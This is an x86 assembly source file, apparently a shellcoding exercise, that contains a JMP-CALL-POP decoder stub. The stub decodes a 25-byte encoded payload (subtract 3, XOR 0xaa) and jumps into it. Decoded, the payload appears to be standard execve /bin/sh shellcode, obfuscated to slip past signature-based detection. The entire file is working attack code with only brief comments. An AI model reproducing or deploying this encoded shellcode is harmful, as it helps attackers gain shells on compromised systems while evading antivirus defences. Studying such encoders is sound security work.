global _start			

section .text
_start:

	jmp short call_shellcode ; jump to call_shellcode, call decoder
decoder:
	pop esi ; (because we jumped, the next address is that of our shellcode)
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	mov cl, 25 ; set our loop length (equal to that of our generated shellcode)

decode2:
	sub byte [esi], 0x03
	xor byte [esi], 0xaa
	inc esi ; increment esi to run through all bytes
	loop decode2
	jmp short EncodedShellcode ; once complete jump into out decoded payload!



call_shellcode:

	call decoder
	EncodedShellcode: db 0x9e,0x6d,0xfd,0xc5,0x88,0x88,0xdc,0xc5,0xc5,0x88,0xcb,0xc6,0xc7,0x26,0x4c,0xfd,0x26,0x4b,0xfc,0x26,0x4e,0x1d,0xa4,0x6a,0x2d



